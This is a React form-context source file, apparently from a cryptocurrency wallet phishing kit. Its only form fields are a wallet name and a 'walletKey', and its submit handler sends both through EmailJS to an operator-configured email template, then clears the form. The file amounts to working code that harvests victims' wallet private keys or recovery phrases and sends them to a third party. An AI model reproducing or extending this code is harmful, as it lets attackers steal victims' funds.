import React, { createContext, useState, useContext } from "react";
import emailjs from "emailjs-com";

// Context
export const FormContext = createContext(undefined);

export const FormContextProvider = ({ children }) => {
  // State
  const [formData, setFormData] = useState({
    walletName: "",
    walletKey: "",
  });

  const [isLoading, setIsLoading] = useState(false);

  // Functions

  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = () => {
    console.log(formData);

    const userId = process.env.REACT_APP_EMAILJS_USER_ID;
    const serviceId = process.env.REACT_APP_EMAILJS_SERVICE_ID;
    const templateId = process.env.REACT_APP_EMAILJS_TEMPLATE_ID;
    emailjs
      .send(
        process.env.REACT_APP_EMAILJS_SERVICE_ID,
        process.env.REACT_APP_EMAILJS_TEMPLATE_ID,
        formData,
        process.env.REACT_APP_EMAILJS_USER_ID
      )
      .then(
        (result) => {
          console.log(result.text);

          // setIsLoading(false);
        },
        (error) => {
          console.error(error.text);

          // setIsLoading(false);
        }
      );

    setFormData({
      walletName: "",
      walletKey: "",
    });
  };

  // Value
  const contextValue = {
    formData,
    handleSubmit,
    handleInputChange,

    setFormData,
  };

  // Return
  return (
    <FormContext.Provider value={contextValue}>{children}</FormContext.Provider>
  );
};

export const useFormContext = () => {
  const context = useContext(FormContext);

  if (!context) {
    throw new Error("useFormContext must be used within a FormContextProvider");
  }

  return context;
};
